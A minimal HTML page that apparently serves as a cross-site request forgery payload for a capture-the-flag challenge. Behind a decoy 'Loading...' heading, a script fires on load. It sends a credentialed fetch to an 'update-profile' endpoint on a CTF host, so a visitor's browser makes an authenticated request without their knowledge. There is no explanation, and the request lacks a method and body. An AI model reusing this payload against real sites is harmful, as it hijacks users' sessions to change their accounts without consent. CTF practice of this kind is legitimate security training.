<!DOCTYPE html>
<html>
<body>
<h1>Loading...</h1>
<script>
fetch('http://ctf.learn-it.org:39951/api/update-profile', {

  headers: {'Content-Type': 'application/json'},
  credentials: 'include',

});
</script>
